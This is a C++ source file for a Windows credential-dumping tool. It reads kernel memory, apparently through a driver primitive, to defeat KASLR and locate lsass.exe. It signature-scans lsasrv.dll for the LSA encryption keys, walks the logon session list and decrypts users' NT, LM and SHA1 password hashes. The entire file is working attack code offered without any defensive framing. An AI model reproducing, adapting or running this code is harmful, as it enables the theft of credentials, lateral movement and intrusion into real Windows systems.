#include "lsa.h"
#include <algorithm>
#include <cwctype>
#include <fstream>
#include "crypto.h"

// ================================================================
// Signature tables
// ================================================================

// MSV signatures: pattern, fe_off, cnt_off, corr_off, min_build
static const uint8_t msv_pat0[] = { 0x45,0x89,0x34,0x24,0x48,0x8b,0xfb,0x45,0x85,0xc0,0x0f };
static const uint8_t msv_pat1[] = { 0x45,0x89,0x34,0x24,0x8b,0xfb,0x45,0x85,0xc0,0x0f };
static const uint8_t msv_pat2[] = { 0x45,0x89,0x37,0x49,0x4c,0x8b,0xf7,0x8b,0xf3,0x45,0x85,0xc0,0x0f };
static const uint8_t msv_pat3[] = { 0x45,0x89,0x34,0x24,0x4c,0x8b,0xff,0x8b,0xf3,0x45,0x85,0xc0,0x74 };
static const uint8_t msv_pat4[] = { 0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74 };
static const uint8_t msv_pat5[] = { 0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc9,0x74 };
static const uint8_t msv_pat6[] = { 0x33,0xff,0x45,0x89,0x37,0x48,0x8b,0xf3,0x45,0x85,0xc9,0x74 };
static const uint8_t msv_pat7[] = { 0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74 };

#define SIG(arr) arr, sizeof(arr)

static constexpr MsvSig MSV_SIGS[] = {
    { msv_pat0, sizeof(msv_pat0), 25, -16, 34, 26200 },
    { msv_pat1, sizeof(msv_pat1), 25, -16, 34, 26200 },
    { msv_pat2, sizeof(msv_pat2), 27,  -4,  0, 22631 },
    { msv_pat3, sizeof(msv_pat3), 24,  -4,  0, 20348 },
    { msv_pat4, sizeof(msv_pat4), 23,  -4,  0, 18362 },
    { msv_pat5, sizeof(msv_pat5), 23,  -4,  0, 17134 },
    { msv_pat6, sizeof(msv_pat6), 23,  -4,  0, 15063 },
    { msv_pat7, sizeof(msv_pat7), 16,  -4,  0, 10240 },
};

// LSA signatures: pattern, iv_off, des_off, aes_off, hk_off
static const uint8_t lsa_pat_a[] = {
    0x83,0x64,0x24,0x30,0x00,0x48,0x8d,0x45,0xe0,0x44,0x8b,0x4d,0xd8,0x48,0x8d,0x15
};
static const uint8_t lsa_pat_b[] = {
    0x83,0x64,0x24,0x30,0x00,0x44,0x8b,0x4d,0xd8,0x48,0x8b,0x0d
};
static const uint8_t lsa_pat_c[] = {
    0x83,0x64,0x24,0x30,0x00,0x44,0x8b,0x4c,0x24,0x48,0x48,0x8b,0x0d
};

static constexpr LsaSig LSA_SIGS[] = {
    { lsa_pat_a, sizeof(lsa_pat_a),  71, -89, 16, 0x38 },
    { lsa_pat_a, sizeof(lsa_pat_a),  58, -89, 16, 0x38 },
    { lsa_pat_a, sizeof(lsa_pat_a),  67, -89, 16, 0x38 },
    { lsa_pat_a, sizeof(lsa_pat_a),  61, -73, 16, 0x38 },
    { lsa_pat_b, sizeof(lsa_pat_b),  62, -70, 23, 0x38 },
    { lsa_pat_b, sizeof(lsa_pat_b),  62, -70, 23, 0x28 },
    { lsa_pat_b, sizeof(lsa_pat_b),  58, -62, 23, 0x28 },
    { lsa_pat_c, sizeof(lsa_pat_c),  59, -61, 25, 0x18 },
    { lsa_pat_c, sizeof(lsa_pat_c),  63, -69, 25, 0x18 },
};

// ================================================================
// BCrypt key handle extraction from lsass memory
// ================================================================
static Bytes extract_bcrypt_key(HANDLE h, uint64_t dtb, uint64_t ptr_va, uint32_t hk_off) {
    uint64_t handle_va = read_ptr(h, dtb, ptr_va);
    if (!handle_va) return {};

    auto hk = proc_read(h, dtb, handle_va, 0x20);
    if (hk.size() < 0x20) return {};

    // Check for RUUU tag at offset 4
    if (std::memcmp(hk.data() + 4, "RUUU", 4) != 0) return {};

    uint64_t key_va = rp(hk.data(), 0x10);
    if (!key_va) return {};

    auto kd = proc_read(h, dtb, key_va, hk_off + 0x30);
    if (kd.size() < hk_off + 0x30) return {};

    uint32_t cb = rd(kd.data(), hk_off);
    if (cb == 0 || cb > 64) return {};

    return Bytes(kd.begin() + hk_off + 4, kd.begin() + hk_off + 4 + cb);
}

// ================================================================
// KASLR bypass via SubCmd 2
// ================================================================
SubCmd2Info kaslr_bypass(HANDLE h) {
    auto [ok, regs] = subcmd2(h);
    if (!ok || regs.size() < 448)
        throw std::runtime_error("SubCmd 2 failed");

    uint64_t idtr = 0, cr3 = 0;
    for (size_t i = 0; i + 15 < regs.size(); i += 16) {
        char name[9]{};
        std::memcpy(name, regs.data() + i, 8);
        uint64_t val = rp(regs.data(), i + 8);
        if (std::strcmp(name, "idtr") == 0) idtr = val;
        if (std::strcmp(name, "cr3") == 0) cr3 = val;
    }

    std::cout << std::format("  idtr={:#x} cr3={:#x}\n", idtr, cr3);

    if (!idtr)
        throw std::runtime_error("No IDTR in SubCmd 2 output");

    auto idt = virt_read(h, idtr, 256);
    if (idt.empty())
        throw std::runtime_error("Failed to read IDT");

    uint64_t min_isr = 0;
    size_t n_entries = std::min<size_t>(16, idt.size() / 16);
    for (size_t i = 0; i < n_entries; ++i) {
        const uint8_t* e = idt.data() + i * 16;
        uint64_t isr = static_cast<uint64_t>(rw(e, 0))
                     | (static_cast<uint64_t>(rw(e, 6)) << 16)
                     | (static_cast<uint64_t>(rd(e, 8)) << 32);
        if (isr > 0xFFFF000000000000ULL) {
            if (min_isr == 0 || isr < min_isr)
                min_isr = isr;
        }
    }
    if (!min_isr)
        throw std::runtime_error("No valid ISR in IDT");

    uint64_t ntos_base = 0;
    uint64_t scan_base = min_isr & ~0xFFFULL;
    for (uint32_t i = 0; i < 4096; ++i) {
        auto page = virt_read(h, scan_base - i * 0x1000, 2);
        if (page.size() >= 2 && page[0] == 'M' && page[1] == 'Z') {
            ntos_base = scan_base - i * 0x1000;
            break;
        }
    }
    if (!ntos_base)
        throw std::runtime_error("ntoskrnl base not found");

    return SubCmd2Info{ .ntos_base = ntos_base, .kpcr = 0, .cr3 = cr3 };
}

// ================================================================
// Leak SYSTEM EPROCESS via SystemHandleInformation (class 16)
// SeDebug privilege must be enabled or Object pointers are zeroed.
// ================================================================

struct SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
};

struct SYSTEM_HANDLE_INFORMATION_S {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
};

using NtQuerySystemInformation_t = LONG(WINAPI*)(ULONG, PVOID, ULONG, PULONG);
using RtlAdjustPrivilege_t = LONG(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

static uint64_t leak_system_eprocess() {
    auto ntdll = GetModuleHandleW(L"ntdll.dll");

    auto NtQuerySystemInformation = reinterpret_cast<NtQuerySystemInformation_t>(
        GetProcAddress(ntdll, "NtQuerySystemInformation"));
    auto RtlAdjustPrivilege = reinterpret_cast<RtlAdjustPrivilege_t>(
        GetProcAddress(ntdll, "RtlAdjustPrivilege"));

    if (!NtQuerySystemInformation || !RtlAdjustPrivilege)
        throw std::runtime_error("Cannot resolve ntdll functions");

    // Enable SeDebug privilege (required for Object pointers in handle table)
    BOOLEAN old = FALSE;
    RtlAdjustPrivilege(20 /*SE_DEBUG_PRIVILEGE*/, TRUE, FALSE, &old);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 4);
    if (!hProcess)
        throw std::runtime_error(std::format("OpenProcess(PID 4) failed: {}", GetLastError()));

    DWORD my_pid = GetCurrentProcessId();
    USHORT my_handle = static_cast<USHORT>(reinterpret_cast<uintptr_t>(hProcess));

    std::cout << std::format("  Handle to SYSTEM (PID 4), our PID={}, handle={:#x}\n",
                             my_pid, my_handle);

    // Query SystemHandleInformation (class 16) with do-while doubling
    ULONG len = sizeof(SYSTEM_HANDLE_INFORMATION_S);
    SYSTEM_HANDLE_INFORMATION_S* info = nullptr;
    LONG status;
    ULONG out_len;

    do {
        len *= 2;
        if (info) GlobalFree(info);
        info = static_cast<SYSTEM_HANDLE_INFORMATION_S*>(GlobalAlloc(GMEM_ZEROINIT, len));
        if (!info) {
            CloseHandle(hProcess);
            throw std::runtime_error("GlobalAlloc failed");
        }
        status = NtQuerySystemInformation(16, info, len, &out_len);
    } while (status == static_cast<LONG>(0xC0000004));

    if (status != 0) {
        CloseHandle(hProcess);
        GlobalFree(info);
        throw std::runtime_error(std::format("NtQuerySystemInformation failed: {:#x}",
                                             static_cast<uint32_t>(status)));
    }

    std::cout << std::format("  Handle table: {} entries\n", info->NumberOfHandles);

    uint64_t system_eprocess = 0;
    for (ULONG i = 0; i < info->NumberOfHandles; ++i) {
        auto& entry = info->Handles[i];
        if (entry.UniqueProcessId == static_cast<USHORT>(my_pid) &&
            entry.HandleValue == my_handle) {
            system_eprocess = reinterpret_cast<uint64_t>(entry.Object);
            std::cout << std::format("  SYSTEM EPROCESS={:#x}\n", system_eprocess);
            break;
        }
    }

    CloseHandle(hProcess);
    GlobalFree(info);

    if (!system_eprocess)
        throw std::runtime_error("Handle not found in system handle table");

    return system_eprocess;
}

// ================================================================
// Find lsass.exe: leak SYSTEM EPROCESS -> detect offsets with PID=4 -> walk list
// ================================================================
LsassInfo find_lsass(HANDLE h) {
    uint64_t sys_ep = leak_system_eprocess();

    // Read SYSTEM EPROCESS (PID=4) to detect offsets
    auto ep_data = virt_read(h, sys_ep, 0x800);
    if (ep_data.size() < 0x800)
        throw std::runtime_error("Cannot read SYSTEM EPROCESS");

    uint32_t off_pid = 0, off_links = 0, off_name = 0;

    // Find UniqueProcessId=4 followed by ActiveProcessLinks (kernel pointer)
    for (uint32_t off = 0x100; off < 0x600; off += 8) {
        if (rp(ep_data.data(), off) == 4) {
            uint64_t nxt = rp(ep_data.data(), off + 8);
            if (nxt > 0xFFFF000000000000ULL) {
                off_pid   = off;
                off_links = off + 8;
                break;
            }
        }
    }

    // Find ImageFileName "System"
    for (uint32_t off = 0x200; off < 0x700; ++off) {
        if (ep_data[off] == 'S' && std::memcmp(ep_data.data() + off, "System\0", 7) == 0) {
            off_name = off;
            break;
        }
    }

    std::cout << std::format("  Offsets: PID={:#x} Links={:#x} Name={:#x}\n",
                             off_pid, off_links, off_name);

    if (!off_pid || !off_name)
        throw std::runtime_error("Cannot detect EPROCESS offsets");

    std::cout << "[*] Walk ActiveProcessLinks from SYSTEM to find lsass.exe\n";
    uint64_t head = sys_ep + off_links;
    auto flink_data = virt_read(h, head, 8);
    if (flink_data.size() < 8)
        throw std::runtime_error("Cannot read ActiveProcessLinks");

    uint64_t cur = rp(flink_data.data(), 0);
    std::set<uint64_t> seen = { head };
    int proc_count = 0;

    for (int i = 0; i < 500; ++i) {
        if (seen.contains(cur) || !cur || cur < 0xFFFF000000000000ULL) break;
        seen.insert(cur);
        uint64_t ep = cur - off_links;

        auto nm = virt_read(h, ep + off_name, 16);
        if (nm.empty()) {
            auto nd = virt_read(h, cur, 8);
            cur = (nd.size() >= 8) ? rp(nd.data(), 0) : 0;
            continue;
        }
        nm.push_back(0);
        std::string img(reinterpret_cast<const char*>(nm.data()));
        for (auto& c : img) c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
        proc_count++;

        if (img == "lsass.exe") {
            auto dtb_data = virt_read(h, ep + 0x28, 8);
            if (dtb_data.size() < 8) throw std::runtime_error("Cannot read lsass DTB");
            uint64_t dtb = rp(dtb_data.data(), 0);

            auto pid_data = virt_read(h, ep + off_pid, 8);
            uint64_t pid = (pid_data.size() >= 8) ? rp(pid_data.data(), 0) : 0;
            std::cout << std::format("  lsass.exe PID={} DTB={:#x}\n", pid, dtb);

            // Auto-detect PEB offset
            auto ep2 = virt_read(h, ep, 0x800);
            if (ep2.size() < 0x800) throw std::runtime_error("Cannot read lsass EPROCESS");

            for (uint32_t poff = 0x100; poff < 0x600; poff += 8) {
                uint64_t val = rp(ep2.data(), poff);
                if (val <= 0x10000 || val >= 0x7FFFFFFFFFFFULL) continue;
                auto peb = proc_read(h, dtb, val, 0x20);
                if (peb.size() < 0x20) continue;
                if (std::all_of(peb.begin(), peb.end(), [](uint8_t b) { return b == 0; })) continue;
                uint64_t ldr = rp(peb.data(), 0x18);
                uint64_t im  = rp(peb.data(), 0x10);
                if (ldr > 0x10000 && ldr < 0x7FFFFFFFFFFFULL &&
                    im  > 0x10000 && im  < 0x7FFFFFFFFFFFULL) {
                    std::cout << std::format("  PEB={:#x} LDR={:#x}\n", val, ldr);
                    return LsassInfo{ .eprocess = ep, .dtb = dtb, .peb_offset = poff };
                }
            }
            throw std::runtime_error("Cannot detect PEB offset");
        }

        auto nd = virt_read(h, cur, 8);
        if (nd.size() < 8) break;
        cur = rp(nd.data(), 0);
    }

    throw std::runtime_error(std::format("lsass.exe not found ({} processes)", proc_count));
}

// ================================================================
// Find lsasrv.dll via PEB->LDR module list
// ================================================================
ModuleInfo find_lsasrv(HANDLE h, uint64_t dtb, uint64_t ep, uint32_t peb_off) {
    uint64_t peb_va = rp(virt_read(h, ep + peb_off, 8).data(), 0);
    auto peb = proc_read(h, dtb, peb_va, 0x20);
    uint64_t ldr = rp(peb.data(), 0x18);

    // InMemoryOrderModuleList at LDR_DATA+0x20
    uint64_t head = ldr + 0x20;
    uint64_t cur = read_ptr(h, dtb, head);
    std::set<uint64_t> seen = { head };

    for (int i = 0; i < 200; ++i) {
        if (seen.contains(cur) || !cur) break;
        seen.insert(cur);

        auto entry = proc_read(h, dtb, cur - 0x10, 0x80);
        if (entry.size() < 0x80) break;

        uint64_t dll_base = rp(entry.data(), 0x30);
        uint32_t dll_size = rd(entry.data(), 0x40);
        uint16_t name_len = rw(entry.data(), 0x48);
        uint64_t name_ptr = rp(entry.data(), 0x50);

        if (name_len && name_ptr) {
            auto raw = proc_read(h, dtb, name_ptr, std::min<uint16_t>(name_len, 512));
            std::wstring name(reinterpret_cast<const wchar_t*>(raw.data()), raw.size() / 2);
            for (auto& c : name) c = static_cast<wchar_t>(std::towlower(c));

            if (name.find(L"lsasrv.dll") != std::wstring::npos) {
                std::cout << std::format("  lsasrv.dll base={:#x} size={:#x}\n", dll_base, dll_size);
                return ModuleInfo{ .base = dll_base, .size = dll_size };
            }
        }
        cur = rp(entry.data(), 0x10);
    }
    throw std::runtime_error("lsasrv.dll not found");
}

// ================================================================
// Read DLL from disk as raw bytes (no LoadLibrary)
// ================================================================
static Bytes read_dll_from_disk(const wchar_t* dll_name) {
    wchar_t sys_dir[MAX_PATH]{};
    GetSystemDirectoryW(sys_dir, MAX_PATH);
    std::wstring path = std::wstring(sys_dir) + L"\\" + dll_name;

    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f) return {};
    auto sz = f.tellg();
    f.seekg(0);
    Bytes data(static_cast<size_t>(sz));
    f.read(reinterpret_cast<char*>(data.data()), sz);
    return data;
}

struct PeSectionInfo {
    uint32_t virtual_address;
    uint32_t virtual_size;
    uint32_t raw_offset;
    uint32_t raw_size;
};

static PeSectionInfo find_pe_text_section(const Bytes& pe) {
    if (pe.size() < 0x200) return {};
    uint32_t pe_off = rd(pe.data(), 0x3C);
    if (pe_off + 0x18 > pe.size()) return {};
    uint16_t nsec = rw(pe.data(), pe_off + 6);
    uint16_t opt_sz = rw(pe.data(), pe_off + 0x14);
    uint32_t sec_start = pe_off + 0x18 + opt_sz;

    for (uint16_t i = 0; i < nsec; ++i) {
        uint32_t s = sec_start + i * 40;
        if (s + 40 > pe.size()) break;
        if (std::memcmp(pe.data() + s, ".text", 5) == 0) {
            return {
                .virtual_address = rd(pe.data(), s + 12),
                .virtual_size    = rd(pe.data(), s + 8),
                .raw_offset      = rd(pe.data(), s + 20),
                .raw_size        = rd(pe.data(), s + 16),
            };
        }
    }
    return {};
}

static uint32_t local_search(const uint8_t* mem, uint32_t size,
                             const uint8_t* sig, uint32_t sig_len) {
    for (uint32_t i = 0; i + sig_len <= size; ++i)
        if (std::memcmp(mem + i, sig, sig_len) == 0) return i;
    return 0;
}

// Resolve RIP-relative disp32 from raw file bytes -> returns RVA of target
static uint32_t resolve_rip_raw(const uint8_t* text_raw, uint32_t text_va,
                                uint32_t instruction_off_in_text) {
    int32_t disp;
    std::memcpy(&disp, text_raw + instruction_off_in_text, 4);
    uint32_t instruction_rva = text_va + instruction_off_in_text + 4;
    return static_cast<uint32_t>(static_cast<int32_t>(instruction_rva) + disp);
}

// ================================================================
// Extract LSA encryption keys (local file scan + remote key reads)
// ================================================================
LsaKeys extract_lsa_keys(HANDLE h, uint64_t dtb, uint64_t base, uint32_t size) {
    auto dll = read_dll_from_disk(L"lsasrv.dll");
    if (dll.size() < 0x1000)
        throw std::runtime_error("Cannot read lsasrv.dll from disk");

    auto text = find_pe_text_section(dll);
    if (!text.raw_size)
        throw std::runtime_error("Cannot find .text in lsasrv.dll");

    const uint8_t* text_raw = dll.data() + text.raw_offset;

    for (auto& sig : LSA_SIGS) {
        uint32_t sig_off = local_search(text_raw, text.raw_size,
                                        sig.pattern, static_cast<uint32_t>(sig.pattern_len));
        if (sig_off == 0) continue;

        try {
            uint32_t iv_rva  = resolve_rip_raw(text_raw, text.virtual_address, sig_off + sig.iv_off);
            uint32_t des_rva = resolve_rip_raw(text_raw, text.virtual_address, sig_off + sig.des_off);
            uint32_t aes_rva = resolve_rip_raw(text_raw, text.virtual_address, sig_off + sig.aes_off);

            auto iv = proc_read(h, dtb, base + iv_rva, 16);
            if (iv.size() < 16 || std::all_of(iv.begin(), iv.end(), [](uint8_t b) { return b == 0; }))
                continue;

            auto des = extract_bcrypt_key(h, dtb, base + des_rva, sig.hk_off);
            auto aes = extract_bcrypt_key(h, dtb, base + aes_rva, sig.hk_off);
            if (!des.empty() && !aes.empty()) {
                return LsaKeys{ .iv = std::move(iv), .aes_key = std::move(aes),
                                .des_key = std::move(des) };
            }
        } catch (...) { continue; }
    }
    throw std::runtime_error("LSA keys not found");
}

// ================================================================
// Find LogonSessionList (local file scan + remote validation)
// ================================================================
LogonListInfo find_logon_list(HANDLE h, uint64_t dtb, uint64_t base, uint32_t size, uint32_t build) {
    auto dll = read_dll_from_disk(L"lsasrv.dll");
    if (dll.size() < 0x1000)
        throw std::runtime_error("Cannot read lsasrv.dll from disk");

    auto text = find_pe_text_section(dll);
    if (!text.raw_size)
        throw std::runtime_error("Cannot find .text in lsasrv.dll");

    const uint8_t* text_raw = dll.data() + text.raw_offset;

    for (auto& sig : MSV_SIGS) {
        if (build < sig.min_build) continue;

        uint32_t sig_off = local_search(text_raw, text.raw_size,
                                        sig.pattern, static_cast<uint32_t>(sig.pattern_len));
        if (sig_off == 0) continue;

        try {
            uint32_t fe_rva = resolve_rip_raw(text_raw, text.virtual_address,
                                              sig_off + sig.fe_off);
            uint64_t list_ptr = base + fe_rva;

            if (sig.corr_off) {
                uint32_t extra = rd(text_raw, sig_off + sig.corr_off);
                list_ptr += extra;
            }

            uint64_t head = read_ptr(h, dtb, list_ptr);
            if (head && head != list_ptr) {
                uint32_t count = 1;
                if (build >= 9200 && sig.cnt_off) {
                    uint32_t cnt_rva = resolve_rip_raw(text_raw, text.virtual_address,
                                                       sig_off + sig.cnt_off);
                    auto cb = proc_read(h, dtb, base + cnt_rva, 1);
                    if (!cb.empty() && cb[0]) count = cb[0];
                }
                return LogonListInfo{ .list_ptr = list_ptr, .count = count };
            }
        } catch (...) { continue; }
    }
    throw std::runtime_error("LogonSessionList not found");
}

// ================================================================
// Credential walking internals
// ================================================================
static void walk_primary(HANDLE h, uint64_t dtb, uint64_t pc_ptr,
                         const LsaKeys& keys,
                         std::vector<Credential>& results,
                         const std::wstring& user, const std::wstring& domain) {
    std::set<uint64_t> seen;
    uint64_t cur = pc_ptr;

    while (cur && !seen.contains(cur) && seen.size() < 20) {
        seen.insert(cur);
        auto pd = proc_read(h, dtb, cur, 0x60);
        if (pd.size() < 0x60) break;

        bool all_zero = std::all_of(pd.begin(), pd.end(), [](uint8_t b) { return b == 0; });
        if (all_zero) break;

        uint64_t nxt    = rp(pd.data(), 0);
        auto     pkg    = read_astr(h, dtb, pd.data(), 8);
        uint16_t enc_len = rw(pd.data(), 0x18);
        uint64_t enc_buf = rp(pd.data(), 0x20);

        if (pkg == "Primary" && enc_len > 0 && enc_len < 0x10000 && enc_buf) {
            auto blob = proc_read(h, dtb, enc_buf, enc_len);
            bool blob_zero = std::all_of(blob.begin(), blob.end(), [](uint8_t b) { return b == 0; });

            if (!blob_zero) {
                auto dec = lsa_decrypt(blob, keys.aes_key, keys.des_key, keys.iv);
                if (dec.size() >= 70 && !dec[40] && dec[41]) {
                    // !isIso && isNtOwf
                    std::span<const uint8_t> nt_span  (dec.data() + 0x46, 16);
                    std::span<const uint8_t> lm_span  (dec.data() + 0x56, 16);
                    std::span<const uint8_t> sha_span (dec.data() + 0x66, 20);

                    results.push_back(Credential{
                        .user     = user,
                        .domain   = domain,
                        .nt_hash  = to_hex(nt_span),
                        .lm_hash  = to_hex(lm_span),
                        .sha_hash = to_hex(sha_span),
                    });
                }
            }
        }

        if (!nxt || nxt == pc_ptr) break;
        cur = nxt;
    }
}

static void walk_creds(HANDLE h, uint64_t dtb, uint64_t cred_ptr,
                       const LsaKeys& keys,
                       std::vector<Credential>& results,
                       const std::wstring& user, const std::wstring& domain) {
    std::set<uint64_t> seen;
    uint64_t cur = cred_ptr;

    while (cur && !seen.contains(cur) && seen.size() < 20) {
        seen.insert(cur);
        auto cd = proc_read(h, dtb, cur, 0x20);
        if (cd.size() < 0x20) break;

        uint64_t nxt = rp(cd.data(), 0);
        uint64_t pc  = rp(cd.data(), 0x10);

        if (pc)
            walk_primary(h, dtb, pc, keys, results, user, domain);

        if (!nxt || nxt == cred_ptr) break;
        cur = nxt;
    }
}

// ================================================================
// Walk all logon sessions and extract credentials
// ================================================================
std::vector<Credential> extract_creds(HANDLE h, uint64_t dtb,
                                      uint64_t list_ptr, uint32_t count,
                                      uint32_t build,
                                      const LsaKeys& keys) {
    auto offsets = session_offsets(build);
    std::vector<Credential> results;

    for (uint32_t idx = 0; idx < count; ++idx) {
        uint64_t head_va = list_ptr + idx * 16;
        uint64_t entry = read_ptr(h, dtb, head_va);
        std::set<uint64_t> seen = { head_va };

        while (entry && !seen.contains(entry) && seen.size() < 100) {
            seen.insert(entry);

            auto data = proc_read(h, dtb, entry, 0x200);
            if (data.size() < 0x200) break;

            bool all_zero = std::all_of(data.begin(), data.end(),
                                        [](uint8_t b) { return b == 0; });
            if (all_zero) break;

            auto user     = read_ustr(h, dtb, data.data(), offsets.user);
            auto domain   = read_ustr(h, dtb, data.data(), offsets.domain);
            uint64_t cred = rp(data.data(), offsets.cred_ptr);

            if (!user.empty() && cred)
                walk_creds(h, dtb, cred, keys, results, user, domain);

            entry = rp(data.data(), 0);  // flink
        }
    }
    return results;
}
